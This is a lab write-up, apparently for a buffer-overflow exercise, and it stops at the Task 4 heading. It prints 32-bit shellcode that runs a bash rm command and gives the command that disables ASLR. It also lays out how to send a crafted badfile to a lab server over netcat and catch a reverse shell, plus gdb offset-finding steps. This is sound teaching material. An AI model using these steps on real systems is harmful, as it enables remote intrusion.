# Task 1: Get Familiar with the Shellcode

Move into the directory "shellcode", create first a file called "remove.txt", and put this content in the shellcode_32.py program for the shellcode variable:

```python
shellcode = (
   "\xeb\x29\x5b\x31\xc0\x88\x43\x09\x88\x43\x0c\x88\x43\x47\x89\x5b"
   "\x48\x8d\x4b\x0a\x89\x4b\x4c\x8d\x4b\x0d\x89\x4b\x50\x89\x43\x54"
   "\x8d\x4b\x48\x31\xd2\x31\xc0\xb0\x0b\xcd\x80\xe8\xd2\xff\xff\xff"
   "/bin/bash*"
   "-c*"
   "/bin/rm remove.txt                                        *
   "AAAA"   # Placeholder for argv[0] --> "/bin/bash"
   "BBBB"   # Placeholder for argv[1] --> "-c"
   "CCCC"   # Placeholder for argv[2] --> the command string
   "DDDD"   # Placeholder for argv[3] --> NULL
).encode('latin-1')
```
Then, run:

```console
$ ./shellcode_32.py
$ make
$ ./a32.out
```

And you will see that the file will be removed.

# Task 2: Level-1 Attack

Make always sure that you run the following command to disable the address randomization countermeasure enable by default in every OS:

```console
$ sudo /sbin/sysctl -w kernel.randomize_va_space=0
```

Then, after building and starting all the Docker containers (as explained in the Readme.pdf file), send from the attacker machine a request to the server 10.9.0.5 at the port 9090 using netcat:

```console
$ echo hello | nc 10.9.0.5 9090
```

Substitute the values of EBP and BUF variables inside the file exploit.py in the attacker-code folder using the values returned by the target container, execute that file, open a new shell and start to listen at the port 9090 using netcat in order to reverse the shell and communicate with the server 10.9.0.5 (if running with the "-l" option, becomes a TCP server that listens for a connection on the specified port):

```console
$ nc -nv -l 9090
```

Finally, use netcat to send to the server the created badfile that will overflow the stack of the function bof used by the server, injecting a new return address that will point to the code that reverse the shell:

```console
$ cat badfile | nc 10.9.0.5 9090
```

# Task 3: Level-2 Attack

Create a new Makefile for the server code in which we disable all the mitigations and enable the compilation with the debugging option -g (see Makefile inside server-code-debug folder), then run:

```console
$ make
```

After that, debug the stack-L2.out and stack-L1.out binary files with -q (option that allow to read from a binary file) and execute the following commands for each of the two executables:

```console
$ gdb -q stack-L?
$ b bof
$ pattern create 2000 input
$ r < input
$ p $ebp
$ p &buffer
```

We can notice that the buffer addresses are differents among the two executables, while the ebp addresses are equal. However, even if these addresses are not the same as the real ones used by the programs running on the servers, they suggest to us that the same ebp is used always by the executables. So, just resuing the same ebp retrived in the previous task, and the buffer address returned by the target container, we can exploit another time the buffer overflow lunching a reverse shell.

Notice that the bof function inside the stack program use 3 local variables. If for example 180 bytes are used to store the buffer, 4 + 4 bytes are used for the other two local variables, so the base pointer ebp address is situated after 188 bytes from the buffer's address, specifically at distance equal to 192.

# Task 4: Level-3 Attack

